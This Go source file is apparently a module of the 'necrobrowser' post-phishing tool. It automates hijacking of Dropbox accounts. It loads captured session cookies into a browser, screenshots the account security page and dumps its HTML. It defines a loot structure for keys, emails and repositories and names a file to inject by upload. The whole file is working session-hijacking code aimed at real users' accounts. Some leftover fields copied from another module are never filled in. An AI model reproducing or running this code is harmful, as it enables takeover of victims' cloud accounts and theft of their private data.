package dropbox

import (
	"context"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/action/dom"
	"github.com/muraenateam/necrobrowser/log"

	"github.com/muraenateam/necrobrowser/action/cookie"
	"github.com/muraenateam/necrobrowser/action/screenshot"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "Dropbox"
)

type Dropbox struct {
	zombie.Target
	URL           string
	SecurityURL   string
	Selector      string
	InjectionFile string
}

type Extrusion struct {
	Keys         string // base64 encoded /settings/keys HTML page content
	Security     string // base64 encoded /settings/security HTML page content
	Profile      string
	Account      string
	Emails       string
	Repositories map[string]string // full path - base64 encoded .zip content
}

func NewDrobox(target zombie.Target) *Dropbox {

	target.Tag = zombie.GetTag(Name)
	return &Dropbox{
		Target:        target,
		URL:           "https://www.dropbox.com/",
		SecurityURL:   "https://www.dropbox.com/account/security",
		Selector:      "#page-content > div > div > div > main > div.maestro-app-content > div > div.account-page-tab.account-page-security > div:nth-child(2) > div > div > div",
		InjectionFile: "./injectors/test-file-upload.png",
	}
}

// Name returns the action name
func (z *Dropbox) Name() string {
	return Name
}

// SetTarget updates the zombie target object
func (z *Dropbox) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *Dropbox) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *Dropbox) Instrument() (interface{}, error) {

	var (
		ext Extrusion
		err error
	)

	z.Debug("Instrumenting")
	a := action.Action{Target: z.Target}

	// Set session Cookies
	c := &cookie.Cookie{Action: a}
	if err = c.SetSessionCookies(); err != nil {
		log.Error("Error setting session cookies: %v", err)
		return nil, err
	}

	// Take Screenshot
	s := &screenshot.Screenshot{
		Action:   a,
		URL:      z.SecurityURL,
		Selector: z.Selector,
	}
	if err = s.Take(); err != nil {
		log.Error("Error taking screenshot: %v", err)
		return nil, err
	}

	// Dump Settings
	var html string
	d := &dom.DOM{
		Action:   a,
		URL:      z.SecurityURL,
		Selector: `html`,
	}
	if err = d.DumpSelector(&html); err != nil {
		log.Error("Error retrieving DOM elements: %v", err)
		return nil, err
	}

	return ext, nil
}
